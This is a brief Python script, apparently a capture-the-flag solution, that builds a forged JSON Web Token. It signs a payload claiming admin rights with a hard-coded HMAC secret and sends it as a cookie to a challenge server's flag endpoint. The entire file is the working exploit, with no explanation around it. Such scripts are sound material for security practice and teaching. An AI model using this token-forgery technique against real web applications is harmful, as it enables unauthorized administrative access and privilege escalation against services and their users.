import hmac
import base64
import hashlib
import requests

header = base64.b64encode(b'{"alg":"HS256","typ":"JWT"}')

payload = base64.b64encode(b'{"name":"ccug","admin":true}')
payload = payload.decode().replace("=", "").encode()

signature = hmac.new(b"xook", header + b"." + payload, hashlib.sha256).digest()
signature_base64 = (
    base64.b64encode(signature).decode("utf-8").rstrip("=").replace("+", "%2B")
)

token = header.decode() + "."
token += payload.decode() + "."
token += signature_base64

url = "http://litctf.org:31777/flag"
cookies = {"token": token}

r = requests.get(url, cookies=cookies)

print(r.text)
